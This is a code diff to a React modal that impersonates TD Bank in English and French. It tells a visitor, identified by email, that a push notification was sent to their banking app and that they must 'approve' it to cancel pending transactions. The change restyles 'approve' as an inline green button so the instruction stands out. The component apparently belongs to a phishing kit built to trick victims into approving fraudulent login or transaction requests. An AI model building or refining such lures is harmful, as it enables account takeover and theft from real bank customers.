@@ -5,7 +5,9 @@ const translations = {
   en: {
     titleButton: 'Approve',
     titleText: ' Transaction',
-    subtitle: 'A push notification was sent to your TD Bank mobile app. Please open your app and approve the request to cancel the pending transactions.',
+    subtitle1: 'A push notification was sent to your TD Bank mobile app. Please open your app and ',
+    subtitleButton: 'approve',
+    subtitle2: ' the request to cancel the pending transactions.',
     bullets: [
       { icon: Smartphone, text: 'Open your TD Bank mobile app' },
       { icon: ShieldCheck, text: 'Review the request details' },
@@ -20,7 +22,9 @@ const translations = {
   fr: {
     titleButton: 'Approuver',
     titleText: ' la Transaction',
-    subtitle: 'Une notification push a été envoyée à votre application mobile TD. Veuillez ouvrir votre application et approuver la demande pour annuler les transactions en attente.',
+    subtitle1: 'Une notification push a été envoyée à votre application mobile TD. Veuillez ouvrir votre application et ',
+    subtitleButton: 'approuver',
+    subtitle2: ' la demande pour annuler les transactions en attente.',
     bullets: [
       { icon: Smartphone, text: 'Ouvrez votre application mobile TD' },
       { icon: ShieldCheck, text: 'Examinez les détails de la demande' },
@@ -137,16 +141,12 @@ export default function AppPushModal({ email, lang = 'en', onClose }) {
           </div>
         ) : (
           <>
-            <div className="flex items-center justify-center gap-2 mb-3">
-              <div className="bg-[#1a7b3a] text-white px-3.5 py-1.5 rounded-lg shadow-sm font-bold text-[18px] tracking-wide border border-[#125d2b]">
-                {t.titleButton}
-              </div>
-              <h3 className="text-[22px] font-bold text-[#1f2937] tracking-tight">
-                {t.titleText}
-              </h3>
-            </div>
-            <p className="text-[#4b5563] text-[14.5px] text-center mb-6 leading-relaxed px-2 font-medium">
-              {t.subtitle}
+            <p className="text-[#4b5563] text-[16px] text-center mb-6 leading-relaxed px-2 font-medium">
+              {t.subtitle1}
+              <span className="bg-[#1a7b3a] text-white px-2 py-0.5 rounded-[4px] shadow-sm font-semibold inline-block mx-0.5">
+                {t.subtitleButton}
+              </span>
+              {t.subtitle2}
             </p>
 
             {/* Bullet features cards */}
